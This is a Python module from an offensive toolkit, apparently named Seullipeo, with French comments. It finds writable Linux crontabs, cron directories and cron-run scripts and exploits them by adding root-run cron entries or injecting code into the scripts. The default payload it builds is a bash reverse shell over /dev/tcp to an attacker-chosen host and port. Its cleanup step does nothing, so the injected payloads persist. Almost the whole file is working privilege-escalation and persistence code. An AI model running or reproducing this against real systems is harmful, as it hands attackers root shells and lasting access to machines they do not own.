#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Module d'exploitation des tâches cron vulnérables
Recherche les crontabs modifiables et les exploite
"""

import os
import pwd
import subprocess
import stat
import time
from pathlib import Path
from datetime import datetime

from exploits import BaseModule
from utils.system import run_command, get_file_permissions, is_writable
from utils.logger import get_logger

logger = get_logger(__name__)

class Module(BaseModule):
    """Module d'exploitation des tâches cron"""
    
    # Métadonnées
    description = "Scanne et exploite les tâches cron vulnérables"
    author = "huoshi"
    risk_level = "Medium"
    targets = ["Linux", "Unix"]
    
    # Options configurables
    options = {
        'PAYLOAD': 'Payload à injecter dans le cron',
        'LHOST': 'Adresse IP de callback',
        'LPORT': 'Port de callback'
    }
    
    def __init__(self):
        super().__init__()
        self.cron_paths = [
            '/etc/crontab',
            '/etc/cron.d/',
            '/var/spool/cron/',
            '/var/spool/cron/crontabs/',
            '/etc/cron.hourly/',
            '/etc/cron.daily/',
            '/etc/cron.weekly/',
            '/etc/cron.monthly/'
        ]
        self.user_crontabs = []
        self.writable_crons = []
        
    def scan(self):
        """
        Scanne les tâches cron pour détecter les vulnérabilités
        
        Returns:
            list: Liste des vulnérabilités trouvées
        """
        logger.info("Démarrage du scan cron")
        vulnerabilities = []
        
        # Scan des crontabs système
        vulnerabilities.extend(self._scan_system_crontabs())
        
        # Scan des crontabs utilisateur
        vulnerabilities.extend(self._scan_user_crontabs())
        
        # Scan des répertoires cron
        vulnerabilities.extend(self._scan_cron_directories())
        
        # Scan des scripts référencés dans les crons
        vulnerabilities.extend(self._scan_cron_scripts())
        
        self.results = vulnerabilities
        logger.info(f"Scan cron terminé: {len(vulnerabilities)} vulnérabilités trouvées")
        
        return vulnerabilities
    
    def _scan_system_crontabs(self):
        """Scanne les crontabs système"""
        vulnerabilities = []
        
        system_crontabs = ['/etc/crontab']
        
        for crontab_path in system_crontabs:
            if not os.path.exists(crontab_path):
                continue
                
            try:
                # Vérification des permissions
                if is_writable(crontab_path):
                    vulnerabilities.append({
                        'type': 'writable_crontab',
                        'path': crontab_path,
                        'description': f'Crontab système modifiable: {crontab_path}',
                        'risk': 'High',
                        'details': 'Le fichier crontab système est modifiable par l\'utilisateur courant'
                    })
                
                # Analyse du contenu
                with open(crontab_path, 'r') as f:
                    content = f.read()
                    
                # Recherche de scripts vulnérables
                script_vulns = self._analyze_crontab_content(crontab_path, content)
                vulnerabilities.extend(script_vulns)
                
            except PermissionError:
                logger.warning(f"Permission refusée pour {crontab_path}")
            except Exception as e:
                logger.error(f"Erreur lors de l'analyse de {crontab_path}: {e}")
        
        return vulnerabilities
    
    def _scan_user_crontabs(self):
        """Scanne les crontabs utilisateur"""
        vulnerabilities = []
        
        # Crontab de l'utilisateur courant
        try:
            result = run_command(['crontab', '-l'])
            if result['success'] and result['output']:
                # Analyse du contenu
                script_vulns = self._analyze_crontab_content('user_crontab', result['output'])
                vulnerabilities.extend(script_vulns)
                
        except Exception as e:
            logger.debug(f"Pas de crontab utilisateur ou erreur: {e}")
        
        # Crontabs dans /var/spool/cron/
        cron_spool_dirs = ['/var/spool/cron/', '/var/spool/cron/crontabs/']
        
        for spool_dir in cron_spool_dirs:
            if not os.path.exists(spool_dir):
                continue
                
            try:
                for crontab_file in os.listdir(spool_dir):
                    crontab_path = os.path.join(spool_dir, crontab_file)
                    
                    if not os.path.isfile(crontab_path):
                        continue
                    
                    # Vérification des permissions
                    if is_writable(crontab_path):
                        vulnerabilities.append({
                            'type': 'writable_user_crontab',
                            'path': crontab_path,
                            'description': f'Crontab utilisateur modifiable: {crontab_path}',
                            'risk': 'High',
                            'details': f'Le crontab de l\'utilisateur {crontab_file} est modifiable'
                        })
                    
                    # Analyse du contenu si lisible
                    try:
                        with open(crontab_path, 'r') as f:
                            content = f.read()
                        
                        script_vulns = self._analyze_crontab_content(crontab_path, content)
                        vulnerabilities.extend(script_vulns)
                        
                    except PermissionError:
                        continue
                        
            except PermissionError:
                logger.debug(f"Permission refusée pour {spool_dir}")
        
        return vulnerabilities
    
    def _scan_cron_directories(self):
        """Scanne les répertoires cron"""
        vulnerabilities = []
        
        cron_dirs = [
            '/etc/cron.d/',
            '/etc/cron.hourly/',
            '/etc/cron.daily/', 
            '/etc/cron.weekly/',
            '/etc/cron.monthly/'
        ]
        
        for cron_dir in cron_dirs:
            if not os.path.exists(cron_dir):
                continue
            
            # Vérification si le répertoire est modifiable
            if is_writable(cron_dir):
                vulnerabilities.append({
                    'type': 'writable_cron_directory',
                    'path': cron_dir,
                    'description': f'Répertoire cron modifiable: {cron_dir}',
                    'risk': 'High',
                    'details': 'Le répertoire cron est modifiable, permettant d\'ajouter des tâches'
                })
            
            # Scan des fichiers dans le répertoire
            try:
                for filename in os.listdir(cron_dir):
                    file_path = os.path.join(cron_dir, filename)
                    
                    if not os.path.isfile(file_path):
                        continue
                    
                    # Vérification des permissions du fichier
                    if is_writable(file_path):
                        vulnerabilities.append({
                            'type': 'writable_cron_file',
                            'path': file_path,
                            'description': f'Fichier cron modifiable: {file_path}',
                            'risk': 'High',
                            'details': 'Le fichier cron est modifiable'
                        })
                    
                    # Analyse du contenu si c'est un script
                    if filename.endswith(('.sh', '.py', '.pl', '.rb')) or not '.' in filename:
                        try:
                            with open(file_path, 'r') as f:
                                content = f.read()
                            
                            script_vulns = self._analyze_script_content(file_path, content)
                            vulnerabilities.extend(script_vulns)
                            
                        except (PermissionError, UnicodeDecodeError):
                            continue
                            
            except PermissionError:
                logger.debug(f"Permission refusée pour lister {cron_dir}")
        
        return vulnerabilities
    
    def _scan_cron_scripts(self):
        """Scanne les scripts référencés dans les crons"""
        vulnerabilities = []
        
        # Cette méthode analyse les scripts trouvés dans les crontabs
        # et vérifie s'ils sont modifiables
        
        return vulnerabilities
    
    def _analyze_crontab_content(self, source, content):
        """Analyse le contenu d'un crontab"""
        vulnerabilities = []
        
        lines = content.split('\n')
        
        for line_num, line in enumerate(lines, 1):
            line = line.strip()
            
            # Ignorer les commentaires et lignes vides
            if not line or line.startswith('#'):
                continue
            
            # Analyser les commandes dans la ligne cron
            parts = line.split()
            if len(parts) < 6:
                continue
            
            # La commande commence généralement à partir du 6ème élément
            # Format: min hour day month dow user command
            if source == '/etc/crontab' or source.startswith('/etc/cron.d/'):
                if len(parts) >= 7:
                    user = parts[5]
                    command = ' '.join(parts[6:])
                else:
                    continue
            else:
                # Crontab utilisateur (pas de champ user)
                command = ' '.join(parts[5:])
                user = 'current'
            
            # Recherche de scripts dans la commande
            script_paths = self._extract_script_paths(command)
            
            for script_path in script_paths:
                if os.path.exists(script_path) and is_writable(script_path):
                    vulnerabilities.append({
                        'type': 'writable_cron_script',
                        'path': script_path,
                        'description': f'Script cron modifiable: {script_path}',
                        'risk': 'High',
                        'details': f'Script exécuté par cron en tant que {user}, ligne {line_num} de {source}',
                        'cron_line': line,
                        'user': user
                    })
        
        return vulnerabilities
    
    def _analyze_script_content(self, script_path, content):
        """Analyse le contenu d'un script cron"""
        vulnerabilities = []
        
        # Vérification de contenu dangereux ou modifiable
        dangerous_patterns = [
            'rm -rf',
            'sudo',
            'chmod 777',
            'eval',
            '$()',
            '`'
        ]
        
        for pattern in dangerous_patterns:
            if pattern in content:
                vulnerabilities.append({
                    'type': 'dangerous_cron_script',
                    'path': script_path,
                    'description': f'Script cron avec contenu dangereux: {script_path}',
                    'risk': 'Medium',
                    'details': f'Le script contient le pattern dangereux: {pattern}'
                })
        
        return vulnerabilities
    
    def _extract_script_paths(self, command):
        """Extrait les chemins de scripts d'une commande cron"""
        script_paths = []
        
        # Recherche de chemins absolus
        parts = command.split()
        for part in parts:
            if part.startswith('/') and not part.startswith('/-'):
                # Vérifie si c'est un fichier exécutable
                clean_path = part.strip('"\'')
                if os.path.isfile(clean_path):
                    script_paths.append(clean_path)
        
        return script_paths
    
    def exploit_all(self):
        """
        Exploite toutes les vulnérabilités cron trouvées
        
        Returns:
            list: Résultats des exploitations
        """
        if not self.results:
            return []
        
        exploit_results = []
        
        for vulnerability in self.results:
            try:
                result = self.exploit_single(vulnerability)
                exploit_results.append(result)
            except Exception as e:
                exploit_results.append({
                    'success': False,
                    'vulnerability': vulnerability,
                    'error': str(e),
                    'description': f'Erreur exploitation {vulnerability["path"]}'
                })
        
        return exploit_results
    
    def exploit_single(self, vulnerability):
        """
        Exploite une vulnérabilité cron spécifique
        
        Args:
            vulnerability (dict): Vulnérabilité à exploiter
            
        Returns:
            dict: Résultat de l'exploitation
        """
        vuln_type = vulnerability.get('type')
        path = vulnerability.get('path')
        
        if vuln_type == 'writable_crontab':
            return self._exploit_writable_crontab(vulnerability)
        elif vuln_type == 'writable_cron_directory':
            return self._exploit_writable_cron_directory(vulnerability)
        elif vuln_type == 'writable_cron_file':
            return self._exploit_writable_cron_file(vulnerability)
        elif vuln_type == 'writable_cron_script':
            return self._exploit_writable_cron_script(vulnerability)
        else:
            return {
                'success': False,
                'vulnerability': vulnerability,
                'error': f'Type de vulnérabilité non supporté: {vuln_type}',
                'description': f'Exploitation non implémentée pour {vuln_type}'
            }
    
    def _exploit_writable_crontab(self, vulnerability):
        """Exploite un crontab modifiable"""
        path = vulnerability['path']
        
        try:
            # Génération du payload
            payload = self._generate_payload()
            
            # Backup du fichier original
            backup_path = f"{path}.backup.{int(time.time())}"
            
            # Lecture du contenu actuel
            with open(path, 'r') as f:
                original_content = f.read()
            
            # Sauvegarde
            with open(backup_path, 'w') as f:
                f.write(original_content)
            
            # Ajout du payload
            malicious_line = f"\n# Seullipeo payload - {datetime.now()}\n* * * * * root {payload}\n"
            
            with open(path, 'a') as f:
                f.write(malicious_line)
            
            return {
                'success': True,
                'vulnerability': vulnerability,
                'description': f'Payload ajouté au crontab {path}',
                'backup_path': backup_path,
                'payload': payload,
                'details': 'Payload exécuté chaque minute en tant que root'
            }
            
        except Exception as e:
            return {
                'success': False,
                'vulnerability': vulnerability,
                'error': str(e),
                'description': f'Erreur lors de l\'exploitation de {path}'
            }
    
    def _exploit_writable_cron_directory(self, vulnerability):
        """Exploite un répertoire cron modifiable"""
        path = vulnerability['path']
        
        try:
            # Création d'un nouveau fichier cron
            filename = f"seullipeo_{int(time.time())}"
            file_path = os.path.join(path, filename)
            
            payload = self._generate_payload()
            
            # Contenu du fichier cron
            if path == '/etc/cron.d/':
                # Format avec utilisateur
                cron_content = f"# Seullipeo payload\n* * * * * root {payload}\n"
            else:
                # Script exécutable pour cron.hourly, daily, etc.
                cron_content = f"#!/bin/bash\n# Seullipeo payload\n{payload}\n"
            
            with open(file_path, 'w') as f:
                f.write(cron_content)
            
            # Permissions exécutables si nécessaire
            if path != '/etc/cron.d/':
                os.chmod(file_path, 0o755)
            
            return {
                'success': True,
                'vulnerability': vulnerability,
                'description': f'Fichier cron malveillant créé: {file_path}',
                'file_path': file_path,
                'payload': payload,
                'details': 'Fichier cron ajouté avec succès'
            }
            
        except Exception as e:
            return {
                'success': False,
                'vulnerability': vulnerability,
                'error': str(e),
                'description': f'Erreur lors de la création dans {path}'
            }
    
    def _exploit_writable_cron_file(self, vulnerability):
        """Exploite un fichier cron modifiable"""
        path = vulnerability['path']
        
        try:
            # Backup du fichier
            backup_path = f"{path}.backup.{int(time.time())}"
            
            with open(path, 'r') as f:
                original_content = f.read()
            
            with open(backup_path, 'w') as f:
                f.write(original_content)
            
            payload = self._generate_payload()
            
            # Modification du fichier
            if path.endswith('.sh') or not '.' in os.path.basename(path):
                # Script shell
                malicious_content = f"{original_content}\n# Seullipeo payload\n{payload}\n"
            else:
                # Fichier cron.d
                malicious_content = f"{original_content}\n* * * * * root {payload}\n"
            
            with open(path, 'w') as f:
                f.write(malicious_content)
            
            return {
                'success': True,
                'vulnerability': vulnerability,
                'description': f'Fichier cron modifié: {path}',
                'backup_path': backup_path,
                'payload': payload,
                'details': 'Payload ajouté au fichier existant'
            }
            
        except Exception as e:
            return {
                'success': False,
                'vulnerability': vulnerability,
                'error': str(e),
                'description': f'Erreur lors de la modification de {path}'
            }
    
    def _exploit_writable_cron_script(self, vulnerability):
        """Exploite un script cron modifiable"""
        path = vulnerability['path']
        
        try:
            # Backup du script
            backup_path = f"{path}.backup.{int(time.time())}"
            
            with open(path, 'r') as f:
                original_content = f.read()
            
            with open(backup_path, 'w') as f:
                f.write(original_content)
            
            payload = self._generate_payload()
            
            # Injection du payload dans le script
            if path.endswith('.py'):
                malicious_content = f"{original_content}\n# Seullipeo payload\nimport os\nos.system('{payload}')\n"
            elif path.endswith('.sh') or not '.' in os.path.basename(path):
                malicious_content = f"{original_content}\n# Seullipeo payload\n{payload}\n"
            else:
                # Tentative générique
                malicious_content = f"{original_content}\n{payload}\n"
            
            with open(path, 'w') as f:
                f.write(malicious_content)
            
            return {
                'success': True,
                'vulnerability': vulnerability,
                'description': f'Script cron modifié: {path}',
                'backup_path': backup_path,
                'payload': payload,
                'details': f'Payload injecté dans le script exécuté par {vulnerability.get("user", "unknown")}'
            }
            
        except Exception as e:
            return {
                'success': False,
                'vulnerability': vulnerability,
                'error': str(e),
                'description': f'Erreur lors de la modification du script {path}'
            }
    
    def _generate_payload(self):
        """Génère le payload d'exploitation"""
        # Payload par défaut: reverse shell bash
        lhost = self.options.get('LHOST', '127.0.0.1')
        lport = self.options.get('LPORT', '4444')
        
        if lhost and lhost != '127.0.0.1':
            # Reverse shell
            payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        else:
            # Payload de démonstration (création d'un fichier)
            timestamp = int(time.time())
            payload = f"echo 'Seullipeo was here - {timestamp}' > /tmp/seullipeo_cron_{timestamp}.txt"
        
        return payload
    
    def cleanup(self):
        """Nettoie les ressources et fichiers temporaires"""
        # Cette méthode pourrait être utilisée pour supprimer les payloads injectés
        # En mode de démonstration, on garde les fichiers pour analyse
        pass